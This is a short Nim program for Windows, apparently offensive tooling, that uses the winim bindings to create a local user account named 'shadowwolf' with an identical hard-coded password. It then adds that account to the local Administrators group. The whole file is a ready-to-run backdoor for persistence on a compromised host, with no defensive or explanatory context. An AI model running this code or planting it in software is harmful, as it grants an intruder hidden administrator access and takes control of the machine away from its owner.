import winim/lean
import winim/inc/lm
var user_info = USER_INFO_1(
    usri1_name: "shadowwolf",
    usri1_password: "shadowwolf",
    usri1_priv: USER_PRIV_USER
  )

var account = LOCALGROUP_MEMBERS_INFO_3(
    lgrmi3_domainandname: user_info.usri1_name
  )
var dwError = DWORD 0
NetUserAdd(nil, 1, cast[LPBYTE](&user_info), &dwError)
NetLocalGroupAddMembers(nil, "Administrators", 3, cast[LPBYTE](&account), 1)